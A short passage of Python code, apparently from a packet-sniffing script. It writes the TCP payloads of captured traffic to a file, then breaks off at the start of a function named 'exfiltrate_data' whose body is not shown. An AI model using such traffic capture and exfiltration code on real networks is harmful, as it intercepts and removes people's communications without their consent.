    def packet_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(IP):
            payload = packet[TCP].payload
            if payload:
                with open(output_file, 'a') as f:
                    f.write(payload.decode('utf-8', errors='ignore'))
    
    def exfiltrate_data():
